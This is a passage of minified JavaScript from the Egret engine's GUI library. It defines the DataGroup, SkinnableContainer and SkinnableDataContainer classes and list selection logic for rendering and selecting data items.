						l == a ? f = g : l > a && (c[g] = l - 1)
					}
					-1 != f && c.splice(f, 1)
				}
				c = this.indexToRenderer[a];
				this.indexToRenderer.length > a && this.indexToRenderer.splice(a, 1);
				e.RendererExistenceEvent.dispatchRendererExistenceEvent(this, e.RendererExistenceEvent.RENDERER_REMOVE, c, a, b);
				c && c instanceof d.DisplayObject &&
				this.recycle(c)
			};
			a.prototype.recycle = function (b) {
				this._removeFromDisplayList(b);
				"ownerChanged" in b && b.ownerChanged(null);
				var a = this.rendererToClassMap[b.hashCode].hashCode;
				this.recyclerDic[a] || (this.recyclerDic[a] = new d.Recycler);
				this.recyclerDic[a].push(b)
			};
			a.prototype.resetRenderersIndices = function () {
				if (0 != this.indexToRenderer.length)
					if (this.layout && this.layout.useVirtualLayout)
						for (var b = this.virtualRendererIndices, a = b.length, c = 0; c < a; c++) {
							var d = b[c];
							this.resetRendererItemIndex(d)
						}
					else
						for (b = this.indexToRenderer.length,
							d = 0; d < b; d++)
							this.resetRendererItemIndex(d)
			};
			a.prototype.itemUpdatedHandler = function (b, a) {
				if (!this.renderersBeingUpdated) {
					var c = this.indexToRenderer[a];
					c && this.updateRenderer(c, a, b)
				}
			};
			a.prototype.resetRendererItemIndex = function (b) {
				var a = this.indexToRenderer[b];
				a && (a.itemIndex = b)
			};
			Object.defineProperty(a.prototype, "itemRenderer", {
				get : function () {
					return this._itemRenderer
				},
				set : function (b) {
					this._itemRenderer !== b && (this._itemRenderer = b, this.cleanFreeRenderer = this.typicalItemChanged = this.itemRendererChanged =
							!0, this.removeDataProviderListener(), this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemRendererSkinName", {
				get : function () {
					return this._itemRendererSkinName
				},
				set : function (b) {
					this._itemRendererSkinName != b && (this._itemRendererSkinName = b) && this.initialized && (this.itemRendererSkinNameChange = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemRendererFunction", {
				get : function () {
					return this._itemRendererFunction
				},
				set : function (b) {
					this._itemRendererFunction != b && (this._itemRendererFunction = b, this.typicalItemChanged = this.itemRendererChanged = !0, this.removeDataProviderListener(), this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.itemToRendererClass = function (b) {
				null != this._itemRendererFunction ? (b = this._itemRendererFunction(b), b || (b = this._itemRenderer)) : b = this._itemRenderer;
				return b ? b : a.defaultRendererFactory
			};
			a.prototype.createChildren = function () {
				if (!this.layout) {
					var b = new e.VerticalLayout;
					b.gap = 0;
					b.horizontalAlign = d.HorizontalAlign.CONTENT_JUSTIFY;
					this.layout = b
				}
				c.prototype.createChildren.call(this)
			};
			a.prototype.commitProperties = function () {
				if (this.itemRendererChanged || this.dataProviderChanged || this.useVirtualLayoutChanged)
					this.removeAllRenderers(), this.layout && this.layout.clearVirtualLayoutCache(), this.setTypicalLayoutRect(null), this.itemRendererChanged = this.useVirtualLayoutChanged = !1, this._dataProvider && this._dataProvider.addEventListener(e.CollectionEvent.COLLECTION_CHANGE, this.onCollectionChange,
						this), this.layout && this.layout.useVirtualLayout ? (this.invalidateSize(), this.invalidateDisplayList()) : this.createRenderers(), this.dataProviderChanged && (this.dataProviderChanged = !1, this.verticalScrollPosition = this.horizontalScrollPosition = 0);
				c.prototype.commitProperties.call(this);
				this.typicalItemChanged && (this.typicalItemChanged = !1, this._dataProvider && 0 < this._dataProvider.length && (this.typicalItem = this._dataProvider.getItemAt(0), this.measureRendererSize()));
				if (this.itemRendererSkinNameChange) {
					this.itemRendererSkinNameChange =
						!1;
					for (var b = this.indexToRenderer.length, a = 0; a < b; a++)
						this.setItemRenderSkinName(this.indexToRenderer[a]);
					var d = this.freeRenderers,
					f;
					for (f in d) {
						var h = d[f];
						if (h)
							for (b = h.length, a = 0; a < b; a++)
								this.setItemRenderSkinName(h[a])
					}
				}
			};
			a.prototype.measure = function () {
				this.layout && this.layout.useVirtualLayout && this.ensureTypicalLayoutElement();
				c.prototype.measure.call(this)
			};
			a.prototype.updateDisplayList = function (b, a) {
				this._layoutInvalidateDisplayListFlag && this.layout && this.layout.useVirtualLayout && (this.virtualLayoutUnderway =
						!0, this.ensureTypicalLayoutElement());
				c.prototype.updateDisplayList.call(this, b, a);
				this.virtualLayoutUnderway && this.finishVirtualLayout()
			};
			a.prototype.ensureTypicalLayoutElement = function () {
				!this.layout.typicalLayoutRect && this._dataProvider && 0 < this._dataProvider.length && (this.typicalItem = this._dataProvider.getItemAt(0), this.measureRendererSize())
			};
			a.prototype.measureRendererSize = function () {
				if (this.typicalItem) {
					var b = this.itemToRendererClass(this.typicalItem);
					if (b = this.createOneRenderer(b)) {
						this.createNewRendererFlag =
							!0;
						this.updateRenderer(b, 0, this.typicalItem);
						"validateNow" in b && b.validateNow();
						var a = new d.Rectangle(0, 0, b.preferredWidth, b.preferredHeight);
						this.recycle(b);
						this.setTypicalLayoutRect(a);
						this.createNewRendererFlag = !1
					} else
						this.setTypicalLayoutRect(null)
				} else
					this.setTypicalLayoutRect(null)
			};
			a.prototype.setTypicalLayoutRect = function (b) {
				this.typicalLayoutRect = b;
				this.layout && (this.layout.typicalLayoutRect = b)
			};
			a.prototype.removeAllRenderers = function () {
				for (var b = this.indexToRenderer.length, a, c = 0; c < b; c++)
					if (a =
							this.indexToRenderer[c])
						this.recycle(a), e.RendererExistenceEvent.dispatchRendererExistenceEvent(this, e.RendererExistenceEvent.RENDERER_REMOVE, a, a.itemIndex, a.data);
				this.indexToRenderer = [];
				this.virtualRendererIndices = null;
				this.cleanFreeRenderer && this.cleanAllFreeRenderer()
			};
			a.prototype.createRenderers = function () {
				if (this._dataProvider)
					for (var b = 0, a = this._dataProvider.length, c = 0; c < a; c++) {
						var d = this._dataProvider.getItemAt(c),
						f = this.itemToRendererClass(d);
						if (f = this.createOneRenderer(f))
							this.indexToRenderer[b] =
								f, this.updateRenderer(f, b, d), e.RendererExistenceEvent.dispatchRendererExistenceEvent(this, e.RendererExistenceEvent.RENDERER_ADD, f, b, d), b++
					}
			};
			a.prototype.updateRenderer = function (b, a, c) {
				this.renderersBeingUpdated = !0;
				this._rendererOwner ? b = this._rendererOwner.updateRenderer(b, a, c) : ("ownerChanged" in b && b.ownerChanged(this), b.itemIndex = a, b.label = this.itemToLabel(c), b.data = c);
				this.renderersBeingUpdated = !1;
				return b
			};
			a.prototype.itemToLabel = function (b) {
				return b ? b.toString() : " "
			};
			a.prototype.getElementAt = function (b) {
				return this.indexToRenderer[b]
			};
			a.prototype.getElementIndex = function (b) {
				return b ? this.indexToRenderer.indexOf(b) : -1
			};
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return this._dataProvider ? this._dataProvider.length : 0
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.addChild = function (b) {
				throw Error("addChild()" + a.errorStr + "addElement()\u4ee3\u66ff");
			};
			a.prototype.addChildAt = function (b, c) {
				throw Error("addChildAt()" + a.errorStr + "addElementAt()\u4ee3\u66ff");
			};
			a.prototype.removeChild = function (b) {
				throw Error("removeChild()" +
					a.errorStr + "removeElement()\u4ee3\u66ff");
			};
			a.prototype.removeChildAt = function (b) {
				throw Error("removeChildAt()" + a.errorStr + "removeElementAt()\u4ee3\u66ff");
			};
			a.prototype.setChildIndex = function (b, c) {
				throw Error("setChildIndex()" + a.errorStr + "setElementIndex()\u4ee3\u66ff");
			};
			a.prototype.swapChildren = function (b, c) {
				throw Error("swapChildren()" + a.errorStr + "swapElements()\u4ee3\u66ff");
			};
			a.prototype.swapChildrenAt = function (b, c) {
				throw Error("swapChildrenAt()" + a.errorStr + "swapElementsAt()\u4ee3\u66ff");
			};
			a.defaultRendererFactory = new e.ClassFactory(e.ItemRenderer);
			a.errorStr = "\u5728\u6b64\u7ec4\u4ef6\u4e2d\u4e0d\u53ef\u7528\uff0c\u82e5\u6b64\u7ec4\u4ef6\u4e3a\u5bb9\u5668\u7c7b\uff0c\u8bf7\u4f7f\u7528";
			return a
		}
		(e.GroupBase);
		e.DataGroup = f;
		f.prototype.__class__ = "egret.gui.DataGroup"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.contentGroupProperties = {};
				this.hostComponentKey = "egret.gui.SkinnableContainer"
			}
			__extends(a, c);
			a.prototype._getCurrentContentGroup = function () {
				return null == this.contentGroup ? (null == this._placeHolderGroup && (this._placeHolderGroup = new d.Group, this._placeHolderGroup.visible = !1, this._addToDisplayList(this._placeHolderGroup)), this._placeHolderGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_ADD, this._contentGroup_elementAddedHandler,
						this), this._placeHolderGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_REMOVE, this._contentGroup_elementRemovedHandler, this), this._placeHolderGroup) : this.contentGroup
			};
			Object.defineProperty(a.prototype, "elementsContent", {
				set : function (b) {
					this._getCurrentContentGroup().elementsContent = b
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "numElements", {
				get : function () {
					return this._getCurrentContentGroup().numElements
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.getElementAt = function (b) {
				return this._getCurrentContentGroup().getElementAt(b)
			};
			a.prototype.addElement = function (b) {
				return this._getCurrentContentGroup().addElement(b)
			};
			a.prototype.addElementAt = function (b, a) {
				return this._getCurrentContentGroup().addElementAt(b, a)
			};
			a.prototype.removeElement = function (b) {
				return this._getCurrentContentGroup().removeElement(b)
			};
			a.prototype.removeElementAt = function (b) {
				return this._getCurrentContentGroup().removeElementAt(b)
			};
			a.prototype.removeAllElements = function () {
				this._getCurrentContentGroup().removeAllElements()
			};
			a.prototype.getElementIndex = function (b) {
				return this._getCurrentContentGroup().getElementIndex(b)
			};
			a.prototype.setElementIndex = function (b, a) {
				this._getCurrentContentGroup().setElementIndex(b, a)
			};
			a.prototype.swapElements = function (b, a) {
				this._getCurrentContentGroup().swapElements(b, a)
			};
			a.prototype.swapElementsAt = function (b, a) {
				this._getCurrentContentGroup().swapElementsAt(b, a)
			};
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return null != this.contentGroup ? this.contentGroup.layout : this.contentGroupProperties.layout
				},
				set : function (b) {
					null != this.contentGroup ? this.contentGroup.layout = b : this.contentGroupProperties.layout =
						b
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				if (a == this.contentGroup) {
					void 0 !== this.contentGroupProperties.layout && (this.contentGroup.layout = this.contentGroupProperties.layout, this.contentGroupProperties = {});
					if (this._placeHolderGroup) {
						this._placeHolderGroup.removeEventListener(d.ElementExistenceEvent.ELEMENT_ADD, this._contentGroup_elementAddedHandler, this);
						this._placeHolderGroup.removeEventListener(d.ElementExistenceEvent.ELEMENT_REMOVE,
							this._contentGroup_elementRemovedHandler, this);
						for (var f = this._placeHolderGroup._getElementsContent().concat(), y = this._placeHolderGroup.numElements; 0 < y; y--) {
							var h = this._placeHolderGroup.removeElementAt(0);
							h.ownerChanged(null)
						}
						this._removeFromDisplayList(this._placeHolderGroup);
						this.contentGroup.elementsContent = f;
						for (y = f.length - 1; 0 <= y; y--)
							h = f[y], h.ownerChanged(this);
						this._placeHolderGroup = null
					}
					this.contentGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_ADD, this._contentGroup_elementAddedHandler,
						this);
					this.contentGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_REMOVE, this._contentGroup_elementRemovedHandler, this)
				}
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this, b, a);
				if (a == this.contentGroup && (this.contentGroup.removeEventListener(d.ElementExistenceEvent.ELEMENT_ADD, this._contentGroup_elementAddedHandler, this), this.contentGroup.removeEventListener(d.ElementExistenceEvent.ELEMENT_REMOVE, this._contentGroup_elementRemovedHandler, this), this.contentGroupProperties.layout =
							this.contentGroup.layout, this.contentGroup.layout = null, 0 < this.contentGroup.numElements)) {
					for (this._placeHolderGroup = new d.Group; 0 < this.contentGroup.numElements; )
						this._placeHolderGroup.addElement(this.contentGroup.getElementAt(0));
					this._placeHolderGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_ADD, this._contentGroup_elementAddedHandler, this);
					this._placeHolderGroup.addEventListener(d.ElementExistenceEvent.ELEMENT_REMOVE, this._contentGroup_elementRemovedHandler, this)
				}
			};
			a.prototype._contentGroup_elementAddedHandler =
			function (b) {
				b.element.ownerChanged(this);
				this.dispatchEvent(b)
			};
			a.prototype._contentGroup_elementRemovedHandler = function (b) {
				b.element.ownerChanged(null);
				this.dispatchEvent(b)
			};
			return a
		}
		(d.SkinnableComponent);
		d.SkinnableContainer = f;
		f.prototype.__class__ = "egret.gui.SkinnableContainer"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._dataGroupProperties = {};
				this.hostComponentKey = "egret.gui.SkinnableDataContainer"
			}
			__extends(a, c);
			a.prototype.updateRenderer = function (b, a, c) {
				"ownerChanged" in b && b.ownerChanged(this);
				b.itemIndex = a;
				b.label = this.itemToLabel(c);
				b.data = c;
				return b
			};
			a.prototype.itemToLabel = function (b) {
				return null !== b ? b.toString() : " "
			};
			Object.defineProperty(a.prototype, "dataProvider", {
				get : function () {
					return this._getDataProvider()
				},
				set : function (b) {
					this._setDataProvider(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._getDataProvider = function () {
				return null != this.dataGroup ? this.dataGroup.dataProvider : this._dataGroupProperties.dataProvider
			};
			a.prototype._setDataProvider = function (b) {
				null == this.dataGroup ? this._dataGroupProperties.dataProvider = b : (this.dataGroup.dataProvider = b, this._dataGroupProperties.dataProvider = !0)
			};
			Object.defineProperty(a.prototype, "itemRenderer", {
				get : function () {
					return this.dataGroup ? this.dataGroup.itemRenderer : this._dataGroupProperties.itemRenderer
				},
				set : function (b) {
					null == this.dataGroup ? this._dataGroupProperties.itemRenderer = b : (this.dataGroup.itemRenderer = b, this._dataGroupProperties.itemRenderer = !0)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemRendererSkinName", {
				get : function () {
					return this.dataGroup ? this.dataGroup.itemRendererSkinName : this._dataGroupProperties.itemRendererSkinName
				},
				set : function (b) {
					null == this.dataGroup ? this._dataGroupProperties.itemRendererSkinName = b : (this.dataGroup.itemRendererSkinName = b, this._dataGroupProperties.itemRendererSkinName =
								!0)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemRendererFunction", {
				get : function () {
					return this.dataGroup ? this.dataGroup.itemRendererFunction : this._dataGroupProperties.itemRendererFunction
				},
				set : function (b) {
					null == this.dataGroup ? this._dataGroupProperties.itemRendererFunction = b : (this.dataGroup.itemRendererFunction = b, this._dataGroupProperties.itemRendererFunction = !0)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this.dataGroup ?
					this.dataGroup.layout : this._dataGroupProperties.layout
				},
				set : function (b) {
					this._setLayout(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setLayout = function (b) {
				null == this.dataGroup ? this._dataGroupProperties.layout = b : (this.dataGroup.layout = b, this._dataGroupProperties.layout = !0)
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				if (a == this.dataGroup) {
					var f = {};
					void 0 !== this._dataGroupProperties.layout && (this.dataGroup.layout = this._dataGroupProperties.layout, f.layout = !0);
					void 0 !==
					this._dataGroupProperties.dataProvider && (this.dataGroup.dataProvider = this._dataGroupProperties.dataProvider, f.dataProvider = !0);
					void 0 !== this._dataGroupProperties.itemRenderer && (this.dataGroup.itemRenderer = this._dataGroupProperties.itemRenderer, f.itemRenderer = !0);
					void 0 !== this._dataGroupProperties.itemRendererSkinName && (this.dataGroup.itemRendererSkinName = this._dataGroupProperties.itemRendererSkinName, f.itemRendererSkinName = !0);
					void 0 !== this._dataGroupProperties.itemRendererFunction && (this.dataGroup.itemRendererFunction =
							this._dataGroupProperties.itemRendererFunction, f.itemRendererFunction = !0);
					this.dataGroup._rendererOwner = this;
					this._dataGroupProperties = f;
					this.hasEventListener(d.RendererExistenceEvent.RENDERER_ADD) && this.dataGroup.addEventListener(d.RendererExistenceEvent.RENDERER_ADD, this.dispatchEvent, this);
					this.hasEventListener(d.RendererExistenceEvent.RENDERER_REMOVE) && this.dataGroup.addEventListener(d.RendererExistenceEvent.RENDERER_REMOVE, this.dispatchEvent, this)
				}
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this,
					b, a);
				if (a == this.dataGroup) {
					this.dataGroup.removeEventListener(d.RendererExistenceEvent.RENDERER_ADD, this.dispatchEvent, this);
					this.dataGroup.removeEventListener(d.RendererExistenceEvent.RENDERER_REMOVE, this.dispatchEvent, this);
					var f = {};
					this._dataGroupProperties.layout && (f.layout = this.dataGroup.layout);
					this._dataGroupProperties.dataProvider && (f.dataProvider = this.dataGroup.dataProvider);
					this._dataGroupProperties.itemRenderer && (f.itemRenderer = this.dataGroup.itemRenderer);
					this._dataGroupProperties.itemRendererSkinName &&
					(f.itemRendererSkinName = this.dataGroup.itemRendererSkinName);
					this._dataGroupProperties.itemRendererFunction && (f.itemRendererFunction = this.dataGroup.itemRendererFunction);
					this._dataGroupProperties = f;
					this.dataGroup._rendererOwner = null;
					this.dataGroup.dataProvider = null;
					this.dataGroup.layout = null
				}
			};
			a.prototype.addEventListener = function (b, a, f, y, h) {
				"undefined" === typeof y && (y = !1);
				"undefined" === typeof h && (h = 0);
				c.prototype.addEventListener.call(this, b, a, f, y, h);
				b == d.RendererExistenceEvent.RENDERER_ADD && this.dataGroup &&
				this.dataGroup.addEventListener(d.RendererExistenceEvent.RENDERER_ADD, this.dispatchEvent, this);
				b == d.RendererExistenceEvent.RENDERER_REMOVE && this.dataGroup && this.dataGroup.addEventListener(d.RendererExistenceEvent.RENDERER_REMOVE, this.dispatchEvent, this)
			};
			a.prototype.removeEventListener = function (b, a, f, y) {
				"undefined" === typeof y && (y = !1);
				c.prototype.removeEventListener.call(this, b, a, f, y);
				b == d.RendererExistenceEvent.RENDERER_ADD && this.dataGroup && (this.hasEventListener(d.RendererExistenceEvent.RENDERER_ADD) ||
					this.dataGroup.removeEventListener(d.RendererExistenceEvent.RENDERER_ADD, this.dispatchEvent, this));
				b == d.RendererExistenceEvent.RENDERER_REMOVE && this.dataGroup && (this.hasEventListener(d.RendererExistenceEvent.RENDERER_REMOVE) || this.dataGroup.removeEventListener(d.RendererExistenceEvent.RENDERER_REMOVE, this.dispatchEvent, this))
			};
			return a
		}
		(d.SkinnableComponent);
		d.SkinnableDataContainer = f;
		f.prototype.__class__ = "egret.gui.SkinnableDataContainer"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._doingWholesaleChanges = !1;
				this._labelField = "label";
				this.requireSelectionChanged = this._requireSelection = !1;
				this._proposedSelectedIndex = a.NO_PROPOSED_SELECTION;
				this._selectedIndex = a.NO_SELECTION;
				this.selectedIndexAdjusted = this._useVirtualLayout = this._dispatchChangeAfterSelection = this._allowCustomSelectedItem = !1
			}
			__extends(a, c);
			a.prototype._setDataProvider = function (b) {
				this.dataProvider && this.dataProvider.removeEventListener(e.CollectionEvent.COLLECTION_CHANGE,
					this.dataProvider_collectionChangeHandler, this);
				this._doingWholesaleChanges = this.dataProviderChanged = !0;
				b && b.addEventListener(e.CollectionEvent.COLLECTION_CHANGE, this.dataProvider_collectionChangeHandler, this);
				c.prototype._setDataProvider.call(this, b);
				this.invalidateProperties()
			};
			Object.defineProperty(a.prototype, "layout", {
				get : function () {
					return this.dataGroup ? this.dataGroup.layout : this._dataGroupProperties.layout
				},
				set : function (b) {
					b && this.useVirtualLayout && (b.useVirtualLayout = !0);
					this._setLayout(b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "labelField", {
				get : function () {
					return this._labelField
				},
				set : function (b) {
					this._setLabelField(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setLabelField = function (b) {
				b != this._labelField && (this._labelField = b, this.labelFieldOrFunctionChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "labelFunction", {
				get : function () {
					return this._labelFunction
				},
				set : function (b) {
					this._setLabelFunction(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setLabelFunction = function (b) {
				b != this._labelFunction && (this._labelFunction = b, this.labelFieldOrFunctionChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "requireSelection", {
				get : function () {
					return this._requireSelection
				},
				set : function (b) {
					this._setRequireSelection(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setRequireSelection = function (b) {
				b != this._requireSelection && (this._requireSelection = b) && (this.requireSelectionChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype,
				"selectedIndex", {
				get : function () {
					return this._getSelectedIndex()
				},
				set : function (b) {
					this._setSelectedIndex(b, !1)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._getSelectedIndex = function () {
				return this._proposedSelectedIndex != a.NO_PROPOSED_SELECTION ? this._proposedSelectedIndex : this._selectedIndex
			};
			a.prototype._setSelectedIndex = function (b, a) {
				"undefined" === typeof a && (a = !1);
				b != this.selectedIndex && (a && (this._dispatchChangeAfterSelection = this._dispatchChangeAfterSelection || a), this._proposedSelectedIndex = b, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "selectedItem", {
				get : function () {
					return void 0 !== this._pendingSelectedItem ? this._pendingSelectedItem : this._allowCustomSelectedItem && this.selectedIndex == a.CUSTOM_SELECTED_ITEM ? this._selectedItem : this.selectedIndex == a.NO_SELECTION || null == this.dataProvider ? void 0 : this.dataProvider.length > this.selectedIndex ? this.dataProvider.getItemAt(this.selectedIndex) : void 0
				},
				set : function (b) {
					this._setSelectedItem(b, !1)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setSelectedItem = function (b,
				a) {
				"undefined" === typeof a && (a = !1);
				this.selectedItem !== b && (a && (this._dispatchChangeAfterSelection = this._dispatchChangeAfterSelection || a), this._pendingSelectedItem = b, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "useVirtualLayout", {
				get : function () {
					return this._getUseVirtualLayout()
				},
				set : function (b) {
					this._setUseVirtualLayout(b)
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._getUseVirtualLayout = function () {
				return this.layout ? this.layout.useVirtualLayout : this._useVirtualLayout
			};
			a.prototype._setUseVirtualLayout =
			function (b) {
				b != this.useVirtualLayout && (this._useVirtualLayout = b, this.layout && (this.layout.useVirtualLayout = b))
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this.dataProviderChanged && (this._doingWholesaleChanges = this.dataProviderChanged = !1, 0 <= this.selectedIndex && this.dataProvider && this.selectedIndex < this.dataProvider.length ? this.itemSelected(this.selectedIndex, !0) : this.requireSelection ? this._proposedSelectedIndex = 0 : this._setSelectedIndex(-1, !1));
				this.requireSelectionChanged &&
				(this.requireSelectionChanged = !1, this.requireSelection && this.selectedIndex == a.NO_SELECTION && this.dataProvider && 0 < this.dataProvider.length && (this._proposedSelectedIndex = 0));
				void 0 !== this._pendingSelectedItem && (this._proposedSelectedIndex = this.dataProvider ? this.dataProvider.getItemIndex(this._pendingSelectedItem) : a.NO_SELECTION, this._allowCustomSelectedItem && -1 == this._proposedSelectedIndex && (this._proposedSelectedIndex = a.CUSTOM_SELECTED_ITEM, this._selectedItem = this._pendingSelectedItem), this._pendingSelectedItem =
						void 0);
				var b = !1;
				this._proposedSelectedIndex != a.NO_PROPOSED_SELECTION && (b = this.commitSelection());
				this.selectedIndexAdjusted && (this.selectedIndexAdjusted = !1, b || e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT));
				if (this.labelFieldOrFunctionChanged) {
					if (null != this.dataGroup)
						if (this.layout && this.layout.useVirtualLayout)
							for (var d = this.dataGroup.getElementIndicesInView(), f = d.length, y = 0; y < f; y++)
								b = d[y], this.updateRendererLabelProperty(b);
						else
							for (d = this.dataGroup.numElements, b = 0; b < d; b++)
								this.updateRendererLabelProperty(b);
					this.labelFieldOrFunctionChanged = !1
				}
			};
			a.prototype.updateRendererLabelProperty = function (b) {
				if (b = this.dataGroup.getElementAt(b))
					b.label = this.itemToLabel(b.data)
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.dataGroup && (this._useVirtualLayout && this.dataGroup.layout && (this.dataGroup.layout.useVirtualLayout = !0), this.dataGroup.addEventListener(e.RendererExistenceEvent.RENDERER_ADD, this.dataGroup_rendererAddHandler, this), this.dataGroup.addEventListener(e.RendererExistenceEvent.RENDERER_REMOVE,
						this.dataGroup_rendererRemoveHandler, this))
			};
			a.prototype.partRemoved = function (b, a) {
				c.prototype.partRemoved.call(this, b, a);
				a == this.dataGroup && (this.dataGroup.removeEventListener(e.RendererExistenceEvent.RENDERER_ADD, this.dataGroup_rendererAddHandler, this), this.dataGroup.removeEventListener(e.RendererExistenceEvent.RENDERER_REMOVE, this.dataGroup_rendererRemoveHandler, this))
			};
			a.prototype.updateRenderer = function (b, a, d) {
				this.itemSelected(a, this._isItemIndexSelected(a));
				return c.prototype.updateRenderer.call(this,
					b, a, d)
			};
			a.prototype.itemToLabel = function (b) {
				if (null != this._labelFunction)
					return this._labelFunction(b);
				if ("string" == typeof b)
					return b;
				if (b instanceof d.XML)
					try {
						0 != b[this.labelField].length() && (b = b[this.labelField])
					} catch (a) {}

				else if (b instanceof Object)
					try {
						null != b[this.labelField] && (b = b[this.labelField])
					} catch (c) {}

				if ("string" == typeof b)
					return b;
				try {
					if (null !== b)
						return b.toString()
				} catch (e) {}

				return " "
			};
			a.prototype.itemSelected = function (b, a) {
				if (this.dataGroup) {
					var c = this.dataGroup.getElementAt(b);
					null !=
					c && (c.selected = a)
				}
			};
			a.prototype._isItemIndexSelected = function (b) {
				return b == this.selectedIndex
			};
			a.prototype.commitSelection = function (b) {
				"undefined" === typeof b && (b = !0);
				var c = this.dataProvider ? this.dataProvider.length - 1 : -1,
				d = this._selectedIndex;
				if (!this._allowCustomSelectedItem || this._proposedSelectedIndex != a.CUSTOM_SELECTED_ITEM)
					if (this._proposedSelectedIndex < a.NO_SELECTION && (this._proposedSelectedIndex = a.NO_SELECTION), this._proposedSelectedIndex > c && (this._proposedSelectedIndex = c), this.requireSelection &&
						this._proposedSelectedIndex == a.NO_SELECTION && this.dataProvider && 0 < this.dataProvider.length)
						return this._proposedSelectedIndex = a.NO_PROPOSED_SELECTION, this._dispatchChangeAfterSelection = !1;
				c = this._proposedSelectedIndex;
				if (this._dispatchChangeAfterSelection && !e.IndexChangeEvent.dispatchIndexChangeEvent(this, e.IndexChangeEvent.CHANGING, this._selectedIndex, this._proposedSelectedIndex, !0))
					return this.itemSelected(this._proposedSelectedIndex, !1), this._proposedSelectedIndex = a.NO_PROPOSED_SELECTION, this._dispatchChangeAfterSelection =
						!1;
				this._selectedIndex = c;
				this._proposedSelectedIndex = a.NO_PROPOSED_SELECTION;
				d != a.NO_SELECTION && this.itemSelected(d, !1);
				this._selectedIndex != a.NO_SELECTION && this.itemSelected(this._selectedIndex, !0);
				b && (this._dispatchChangeAfterSelection && (e.IndexChangeEvent.dispatchIndexChangeEvent(this, e.IndexChangeEvent.CHANGE, d, this._selectedIndex), this._dispatchChangeAfterSelection = !1), e.UIEvent.dispatchUIEvent(this, e.UIEvent.VALUE_COMMIT));
				return !0
			};
			a.prototype.adjustSelection = function (b, c) {
				this._proposedSelectedIndex !=
				a.NO_PROPOSED_SELECTION ? this._proposedSelectedIndex = b : this._selectedIndex = b;
				this.selectedIndexAdjusted = !0;
				this.invalidateProperties()
			};
			a.prototype.itemAdded = function (b) {
				this._doingWholesaleChanges || (this.selectedIndex == a.NO_SELECTION ? this.requireSelection && this.adjustSelection(b, !0) : b <= this.selectedIndex && this.adjustSelection(this.selectedIndex + 1, !0))
			};
			a.prototype.itemRemoved = function (b) {
				this.selectedIndex == a.NO_SELECTION || this._doingWholesaleChanges || (b == this.selectedIndex ? this.requireSelection &&
					this.dataProvider && 0 < this.dataProvider.length ? 0 == b ? (this._proposedSelectedIndex = 0, this.invalidateProperties()) : this._setSelectedIndex(0, !1) : this.adjustSelection(-1, !1) : b < this.selectedIndex && this.adjustSelection(this.selectedIndex - 1, !1))
			};
			a.prototype.dataGroup_rendererAddHandler = function (b) {
				b = b.renderer;
				null != b && (b.addEventListener(d.TouchEvent.TOUCH_ROLL_OVER, this.item_mouseEventHandler, this), b.addEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.item_mouseEventHandler, this))
			};
			a.prototype.dataGroup_rendererRemoveHandler =
			function (b) {
				b = b.renderer;
